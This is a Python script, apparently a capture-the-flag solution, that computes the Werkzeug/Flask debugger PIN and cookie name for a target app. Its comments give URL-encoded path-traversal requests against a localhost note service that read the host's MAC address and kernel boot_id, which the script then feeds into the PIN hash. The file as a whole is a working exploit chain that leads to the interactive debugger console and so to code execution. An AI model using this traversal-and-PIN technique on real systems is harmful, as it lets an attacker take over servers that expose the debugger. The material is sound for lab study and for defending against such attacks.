import hashlib
from itertools import chain

probably_public_bits = [
    "ctfuser",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.11/dist-packages/flask/app.py",  
]

mac = "ea:ef:e2:65:98:65" # http://localhost:3000/note/%2e%2e%2f%2e%2e%2fsys/class/net/eth0/address
boot_id = "031689c9-ab00-420a-a427-0fa54c9023a3" # http://localhost:3000/note/%2e%2e%2f%2e%2e%2fproc/sys/kernel/random/boot_id
mac_int = int(mac.replace(":", ""), 16)

print(mac_int)
private_bits = [
    str(mac_int),
    boot_id,
]
print(private_bits)

for i, bit in enumerate(probably_public_bits, 1):
    print(f"  {i}. {repr(bit)}")

for i, bit in enumerate(private_bits, 5):
    print(f"  {i}. {repr(bit)}")

hash_func = hashlib.sha1
h = hash_func()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)

h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
rv = None
for group_size in (5, 4, 3):
    if len(num) % group_size == 0:
        rv = "-".join(
            num[x : x + group_size].rjust(group_size, "0")
            for x in range(0, len(num), group_size)
        )
        break
if rv is None:
    rv = num

print(rv)